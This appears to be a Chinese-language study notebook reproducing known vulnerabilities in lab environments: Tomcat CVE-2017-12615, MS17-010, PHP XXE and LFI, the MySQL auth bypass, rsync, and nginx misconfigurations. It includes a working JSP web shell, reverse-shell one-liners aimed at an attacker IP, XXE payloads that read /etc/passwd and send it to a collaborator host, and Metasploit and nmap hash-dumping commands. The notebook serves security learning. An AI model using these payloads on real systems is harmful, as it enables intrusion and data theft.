# 漏洞复现
[toc]

这是[有图的版本](../vuln学习笔记.md)


因为涉及到个人资产, 不便公开正文, 所以只有目录, 等时机成熟了我会公开的
> 静静等待`domain expired`和`host down`. 
![](/IMG/content.jpg)

------

```cmake
docker-compose up -d
docker-compose down
docker-compose restart nginx 
```

## TODO:common vulns

- [ ] https://www.cnblogs.com/huidou/p/10858261.html

- [ ] wp rce 

1. 有一些rce代码的限制
https://vulhub.org/#/environments/wordpress/pwnscriptum/
	https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html
	https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/README.zh-cn.md

2. 需要用户发布文章的权限

## Tomcat代码执行漏洞 CVE-2017-12615

因为开启了put方法, 导致可向服务器传jsp马, 期间涉及到对apache不允许直接传jsp文件的绕过, post到路径`/1.jsp/`

, 出现响应码201/204则代表上传成功, 以后每一次PUT的内容会覆盖之前的内容.

> 然而并不清楚怎么知晓服务器支持put方法, 使用option是会报错的; 
>
> 只是之前用awvs扫描的时候看见过此类漏洞, 根本上讲还是put方法的锅, bypass什么的都只是tricks 

**代码**

```jsp
<%@ page import="java.util.*,java.io.*"%> <% %> 
<HTML><BODY> <FORM METHOD="GET" NAME="comments" ACTION="">
<INPUT TYPE="text" NAME="comment"> 
<INPUT TYPE="submit" VALUE="Send"> 
</FORM> <pre> 
<%
 if ( request.getParameter( "comment" ) != null )
 {
	 out.println( "Command: " + request.getParameter( "comment" ) + "<BR>" );
	 Process p		= Runtime.getRuntime().exec( request.getParameter( "comment" ) );
	 OutputStream os	= p.getOutputStream();
	 InputStream in		= p.getInputStream();
	 DataInputStream dis	= new DataInputStream( in );
	 String disr		= dis.readLine();
	 while ( disr != null )
	 {
		 out.println( disr ); disr = dis.readLine();
	 }
 }
 %>
 </pre> 
 </BODY></HTML>
```

![1564278797172](IMG/1564278797172.png)

写入shell成功

![1564280484063](IMG/1564280484063.png)

> 而且经过测试，这个漏洞影响全部的 Tomcat 版本，从 5.x 到 9.x 无不中枪。
>
> 目前来说，最好的解决方式是将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true，才能防止漏洞

ref: [Tomcat 远程代码执行漏洞分析（CVE-2017-12615）及补丁 Bypass](https://mp.weixin.qq.com/s?__biz=MzU3ODAyMjg4OQ==&mid=2247483805&idx=1&sn=503a3e29165d57d3c20ced671761bb5e)

## Netcat + LCX的用法笔记

之前一直听群里大佬在谈"反弹shell", 虽然知道是在后渗透阶段, 无法正向连接时的必杀技, 可是不知道怎么写, 对于nc命令也是一知半解的, 因此专门抽时间深入学习一下

#### windows反向连接linux

```shell
nc -lvvp 8888	                  //控制端, 监听
nc -e cmd.exe [attacker ip] 8888  //受控端, 反向shell连接
```

![window反向连接linux](IMG/1563198005308.png)

进wireshark抓包, 可以看出两边是建立了双向ssh连接的,

![1563198433541](IMG/1563198433541.png)

> 需要注意的是, 反弹的shell里不能删除命令, 也不能用Ctrl C, 否则会马上断开

#### linux反向连接windows

```shell
nc [ip] 8888 -e /bin/sh         //linux的shell
	//还有其它不用netcat的反弹方法
	bash -i >& /dev/tcp/10.0.0.1/8888 0>&1
	#php版本：
     php -r '$sock=fsockopen("10.0.0.1",8888);exec("/bin/sh -i <&3 >&3 2>&3");'	
     

nc -lvvp 8888 	                //监听都是这个命令
```

ref:[nc反弹shell](https://www.jianshu.com/p/5b73a607e2ea)

#### 正向连接

```shell
nc -vv [ip_of_slave] 8888      //控制端主动连接

ncat -lp 8888 -e /bin/bash    //linux受控端监听并转发给shell, 注意此处写nc是不行的
```

#### LCX.EXE

```
lcx -slave [rhost] [rport] [lhost] [lport]     // 肉鸡发起连接,将本地lport(如3389)转发到控制端的rport
lcx -listen [lhost]	[port]		//[port]指其它未被占用的端口,本地连接时就用它, 如8888
```

​	这样就将肉鸡的lport端口, 转发到了我们本地, 只需`127.0.0.1:8888`就可以连接到肉鸡的3389了



#### 总结

`-vv` | 代表verbose | 显示详细信息, **在要下达命令的地方用(**咱攻击端要看回显的嘛)

`-l` | --listen | 绑定和监听接入连接,  **正向连接中用于受控端, 反向连接中用于控制端**

`-p` | --port | 指定连接使用的端口号

`-s` |  --source ip | 客户端指定连接服务器使用的ip

------

ref:[Linux每天一个命令：nc/ncat](https://www.cnblogs.com/chengd/p/7565280.html)



## PHP的LFI漏洞利用

> 在给PHP发送POST数据包时，如果数据包里包含文件区块，无论你访问的代码中有没有处理文件上传的逻辑，PHP都会将这个文件保存成一个临时文件（通常是`/tmp/php[6个随机字符]`），文件名可以在`$_FILES`变量中找到。这个临时文件，在请求结束后就会被删除。
>
> 
>
> phpinfo页面会将当前请求上下文中所有变量都打印出来

​		你想到了什么?

> 如果我们向phpinfo页面发送包含文件区块的数据包，则即可在返回包里找到`$_FILES`变量的内容，自然也包含临时文件名所以安排一下, 我们利用条件竞争

#### 安排一下: 

我们利用条件竞争, 利用高并发的时间差, 即一边往phpinfo页面post可生成shell的php代码(生成临时文件之后会迅速被服务器删除), 另一边访问生成的临时文件, 因为post上传和访问临时文件是异步的, 只要时间足够长, 线程足够多, 那么总有机会让我们访问到临时文件, 从而触发恶意代码生成固定页面的shell



ref:[PHP文件包含漏洞（利用phpinfo）](https://vulhub.org/#/environments/php/inclusion/)

## MS17-010永恒之蓝



> 防火墙里把允许远程协助打开，设置如下：

![1563193293465](IMG/1563193293465.png)

![1563194788800](IMG/1563194788800.png)

去防火墙里允许smb端口服务, 最后查看各端口的监听情况，可以看到445端口是正在监听了的

![1563193406277](IMG/1563193406277.png)

进metasploit的`msfconsole`，命令可以用`search ms17-010`搜索出来，接下来只需要`set rhosts [ip] `即可

```
 use auxiliary/scanner/smb/smb_ms17_010  这是扫描监测模块，可以批量扫描，后面可跟CIDR地址
 use exploit/windows/smb/ms17_010_eternalblue  这是攻击模块
```

通过`show options`设置完要求的几个参数之后,可以直接输入`run`或者`exploit`攻击

 *对于新手来说, 在命令行中善用TAB键自动补全是极其方便的*


  ## PHP环境XML外部实体注入漏洞（XXE）

   **环境介绍**
   
   - PHP 7.0.30
   
   - libxml 2.8.0 
   
     > libxml2.9以前的版本默认支持并开启了对外部实体的引用, 在解析用户提交的XML文件时，未对XML文件引用的外部实体做合适的处理，并且实体的URL支持file://和ftp://等协议，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行等
   
   **源代码**
   
     - dom.php
   
   ```php
   <?php
   $data = file_get_contents('php://input');  //收post的数据
   $dom = new DOMDocument();//新建一个xml文档(的根)
   $dom->loadXML($data);	
   //缺少对用户提供数据$data的过滤
   print_r($dom);
   ```
   
   ![1563106880416](IMG/1563106880416.png)
   
     - SimpleXMLElement.php
   
   ```php+HTML
   <?php
   //SimpleXML 是 PHP 5 中的新特性, 提供了一种获取 XML 元素的名称和文本的简单方式, 无需安装就可以使用
   $data = file_get_contents('php://input');
   $xml = new SimpleXMLElement($data);
   echo $xml->name; 
   ```
   
   ![1563106816628](IMG/1563106816628.png)

     - simplexml_load_string.php

```php+HTML
<?php
$data = file_get_contents('php://input');
$xml = simplexml_load_string($data);
//simplexml_load_string() 把 XML 字符串载入对象中, 允许失败, 返回false

echo $xml->name;
```

**Simple XXE Payload：**

主要是要明白创建xml实体的方式(语法),  DTD类型是什么?  payload里哪些能改, 哪些不能改, 有哪些变数, 可以从外部加载吗, 协议不是php伪协议怎么办等等问题

一个简单的payload如下, post提交即可

```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE abc [
<!ELEMENT name ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<xyz>
	<name>&xxe;</name>
</xyz>
```

**高级玩法**

- **ssrf**/**内网探测,** 在实体定义里将uri请求改为本地的端口号, 如`<!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >`, 可以写成py脚本批量扫描

- **无回显怎么玩?** dnslog, 或者用ceye.io的访问历史查询, 可以在无回显时获取数据, 比如下面就是在将`/etc/passwd`的内容拼在url请求里访问过去, 也可以获取

```
<?xml version="1.0" encoding="utf-8"?> 
  <!DOCTYPE abc [
  <!ELEMENT name ANY >
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % all "<!ENTITY xxe SYSTEM 'http://pkdhs206k7r60vakmse4k41oqfw5ku.burpcollaborator.net/?%file;'>">
  %all; 
  ]>
```
ref:[ dnslog注入](https://www.cnblogs.com/-qing-/p/10623583.html)

- **rce远程代码执行**

  `expect://[command]`
  
  需要在安装[expect扩展](https://www.php.net/manual/zh/wrappers.expect.php)的PHP环境上才可能运行成功,  没复现成功, 扎心. 不过我毕竟试了, 通过`pecl install expect` 命令试着安装结果提示, 那么可能rce的php版本就出来了:
  
  > pecl/expect requires PHP **(version >= 4.0.0, version <= 5.99.9**9),
  
  另外, 除了phpinfo之外, 这里: [PHP查看扩展是否开启的几种方法](https://blog.csdn.net/mengdc/article/details/78029315)

ref: [DTD 简介](http://www.w3school.com.cn/dtd/dtd_intro.asp)

[XML DOM Document 对象](http://www.w3school.com.cn/xmldom/dom_document.asp)

[PHP simplexml_load_string() 函数](http://www.w3school.com.cn/php/func_simplexml_load_string.asp)

[XXE(XML外部实体注入)漏洞](https://blog.csdn.net/qq_36119192/article/details/84993356)

[XML实体注入漏洞](https://www.cnblogs.com/xiaozi/p/5785165.html)

## rsync未授权访问 873端口

```[cmd]
rsync rsync://210.14.136.172:873/  /localpath -av
rsync [ip]::
rsync rsync://210.14.136.172:873
```
ref:	https://my.oschina.net/ccLlinux/blog/1859116

**影响范围**

> mysql CVE-2012-2122  msf-auxiliary/scanner/mysql/mysql_authbypass_hashdump
> All MariaDB and MySQL versions up to 
> 5.1.61, 
> 5.2.11, 
> 5.3.5, 
> *5.5.22* 
> 5.5.23	are	vulnerable.

> MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not.

> MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 are not.

**原理**
对于memcmp(a1,a2,10)，memcmp在两个字符串的\0之后继续比较,估计Haier有丶东西,	ref:	https://seclists.org/oss-sec/2012/q2/493

进msf, 因为中途退出了,第二次run提示"Host '-' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'",提示ip被block了

![](IMG/res_mysql_hash_dump-1563094737649.jpg)

搜索网上的解法是 whereis mysqladmin, 再进到相应的目录实施它的提示命令,参看	https://www.cnblogs.com/susuyu/archive/2013/05/28/3104249.html

**利用**

1. msf

```
auxiliary/scanner/mysql/mysql_version
msf-auxiliary/scanner/mysql/mysql_authbypass_hashdump
```

2. zenmap
   建议先扫c段的MySQL,即按以下顺序来
   nmap -sV -p 3306 -T4 --script mysql-info [CIDR]
   nmap -sV -p 3306 -T2 --script ms-sql-dump-hashes,mysql-dump-hashes,mysql-info,mysql-vuln-cve2012-2122 [addr]
   直接开搞, 12分钟左右扫完一个c段

![](IMG/rsync_namp-1563094756987.jpg)

## nginx错误配置

```
https://vulhub.org/#/environments/nginx/insecure-configuration/
```

1. 别名alias配置时,如果忘记在目录名files后加/  ,会造成目录穿越,即
	
	```php
	location	/files {
	alias /home/;
	}
	```
	
	**payload:**
	
	`/files..`		会自动补全成为`/files../`,  可遍历根目录/下的文件	
	
2. add_header覆盖导致xss
Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头,使同源策略csp失效
``` add_header X-Frame-Options SAMEORIGIN; ```
同源策略使得外站无法获取本站数据,如cookie,但无法制约src下的内容. 而CSP策略则是控制src内容的,代表只可加载其后的内容, 如
	
	> Content-Security-Policy: script-src 'self' https://apis.google.com	//self   表示与当前来源（而不是其子域）匹配
	
3. clrf注入漏洞
	
	这块有点概念, 但深入的利用没有很明白,  参考离别歌大兄弟的经验
	
	ref:	https://www.leavesongs.com/PENETRATION/Sina-CRLF-Injection.html

## nginx错误配置之二

首先查看后端的过滤, 是黑名单, php相关的不允许上传

![](IMG/20190314220128229.png)

此处可以通过传写有php代码的图片来绕过, 可是上传之后依然无法访问, 提示如下:

![1564283129891](IMG/1564283129891.png)

[这个地方](https://github.com/nginx/nginx/blob/e957ae888a986290dc789d71d31299fe5463e2fb/src/http/ngx_http_parse.c#L623), 还是比较容易看懂: url里有空格时, 会进到sw_check_uri函数: 就开始了

![2](IMG/20190314224337631.PNG)

读取页面

![1564282409847](IMG/1564282409847.png)

![1564282354737](IMG/1564282354737.png)

经过测试, 因为 空格 和 \0 在浏览器里直接访问时会被转码, 访问是不会成功的(只能在bp改包访问), 所以也写不了访问执行的shell, 更没法写菜刀可以连接的shell...

此外, 改漏洞还可以用于越权访问文件夹, 举个例子，比如很多网站限制了允许访问后台的IP：

```c++
location /admin/ {
    allow 127.0.0.1;
    deny all;
}
```

我们可以请求如下URI：`/test[0x20]/../admin/index.php`，这个URI不会匹配上location后面的`/admin/`，也就绕过了其中的IP验证；但最后请求的是`/test[0x20]/../admin/index.php`文件，也就是`/admin/index.php`，成功访问到后台。（这个**前提是需要有一个目录叫`test**`：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会出现文件不存在的错误，Windows下则没有这个限制）

ref: [Nginx 文件名逻辑漏洞（CVE-2013-4547）](https://vulhub.org/#/environments/nginx/CVE-2013-4547/)

[漏洞复现之CVE-2013-4547](https://blog.csdn.net/Blood_Pupil/article/details/88565176)

[文件解析漏洞总结-Nginx](https://blog.werner.wiki/file-resolution-vulnerability-nginx/)


